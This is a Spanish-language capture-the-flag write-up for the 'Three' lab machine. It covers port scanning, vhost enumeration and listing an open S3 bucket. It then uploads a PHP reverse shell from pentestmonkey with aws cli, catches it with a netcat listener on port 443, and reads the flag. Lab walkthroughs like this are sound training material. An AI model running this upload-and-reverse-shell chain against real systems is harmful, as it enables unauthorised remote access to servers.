Maquina: Three

Autor:

Dificultad: Muy Facil

![Screenshot 2024-11-10 183538](https://github.com/user-attachments/assets/723e5af8-477b-4910-9178-04a6c1772101)

Iniciamos la máquina y verificamos la conexión

ping 10.129.65.152 -c 1

![Screenshot 2024-11-10 183802](https://github.com/user-attachments/assets/948ef97f-f391-4d7d-88ef-34d5d15103c5)

realizamos un escaneo de puertos y servicios

nmap -p- --min-rate 5000 -sV 10.129.65.152

el puerto 22 perteneciente al servicio SSH y el puerto 80 perteneciente al servicio HTTP están abiertos

![Screenshot 2024-11-10 183919](https://github.com/user-attachments/assets/cccca470-bbba-46bd-adcf-59f7489800ba)

vamos a la web y encontramos una dirección de correo electrónico que aparece en la sección de contacto: mail@thetoppers.htb

![Screenshot 2024-11-10 183948](https://github.com/user-attachments/assets/1400ba6a-c890-4f86-93db-5b9df8d84d96)

![Screenshot 2024-11-10 184023](https://github.com/user-attachments/assets/d54a6803-ce9f-4111-a4be-367c7801caf6)

añadimos la ip a /etc/hosts

echo 10.129.65.152 thetoppers.htb | sudo tee -a /etc/hosts

![Screenshot 2024-11-10 184239](https://github.com/user-attachments/assets/2cc97e10-0183-4f57-8b4e-0c27040728fd)

identificamos subdominios con Gobuster

gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

![Screenshot 2024-11-10 184733](https://github.com/user-attachments/assets/e48ceb6c-7d0c-4cb0-bfad-55ab517dabbd)

añadimos la dirección del subdominio s3.thetoppers.htb al archivo /etc/hosts

![Screenshot 2024-11-10 185041](https://github.com/user-attachments/assets/1679ffdb-7560-4761-a7f2-7c3559680a5d)

echo 10.129.65.152 s3.thetoppers.htb | sudo tee -a /etc/hosts

vamos a la web

![Screenshot 2024-11-10 185051](https://github.com/user-attachments/assets/56135bcf-3d04-4c6d-8f82-b7132a3103cd)

el servicio se refiere a Amazon Simple Storage Service (Amazon S3)
Este servicio puede usarse para guardar diversos tipos de información, 
como copias de seguridad, archivos multimedia, páginas web estáticas, entre otros.

Lo instalamos y lo configuramos
sudo apt install awscli
aws configure

![Screenshot 2024-11-10 185345](https://github.com/user-attachments/assets/9fc58951-8855-4757-a247-942a6d4d955e)

![Screenshot 2024-11-10 185622](https://github.com/user-attachments/assets/8729ed6c-509d-4e4b-847c-4ca8c24ccf0c)

Esto nos muestra dos elementos de interés y una carpeta llamada "images". Además, 
disponemos de un servicio que nos permite descargar estos archivos de forma remota a nuestro entorno.

aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb

![Screenshot 2024-11-10 185650](https://github.com/user-attachments/assets/dad4e118-a322-471f-a4e9-f90231ac9d43)

Si no hay una configuración que exija autorización para subir archivos, podemos intentar cargar una Reverse Shell. 
Sabemos que el servidor está ejecutando archivos con extensión PHP, por lo que ya sabemos cómo generar una. 
Para este propósito, suelo recurrir a la Reverse Shell en PHP disponible en pentestmonkey. 
Puedes encontrar el script aquí: 

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

copiamos el payload en un file y cambiamos IP y puerto.

![Screenshot 2024-11-10 190554](https://github.com/user-attachments/assets/7c81e59a-50c9-42ae-942e-405b654f985a)

![Screenshot 2024-11-10 190607](https://github.com/user-attachments/assets/85f36252-4324-452c-a2f9-ab84623bc654)

Luego, utilizamos el siguiente comando para subir un archivo desde nuestro sistema local al servicio remoto.

aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

![Screenshot 2024-11-10 190934](https://github.com/user-attachments/assets/9a8981c6-2593-455d-aa45-7f9be699b2f9)

si accedemos a ese archivo mientras tenemos Netcat escuchando en el puerto especificado (443), deberíamos obtener una shell.

nc -nlvp 443

![Screenshot 2024-11-10 190648](https://github.com/user-attachments/assets/f8619f43-a6fd-4f15-a4b2-8295899b8c2d)

Luego, accedemos a http://thetoppers.htb/shell.php.4

![Screenshot 2024-11-10 191410](https://github.com/user-attachments/assets/d7130117-25c3-40a2-b92a-c56ac2498fed)

Encontrados el flag en /var/www/flag.txt

![Screenshot 2024-11-10 191420](https://github.com/user-attachments/assets/4936b202-8280-42ac-9e6c-7e36030eba59)

![Screenshot 2024-11-10 191542](https://github.com/user-attachments/assets/60e2a943-dd0c-401f-b1cb-bfe0afd6f355)
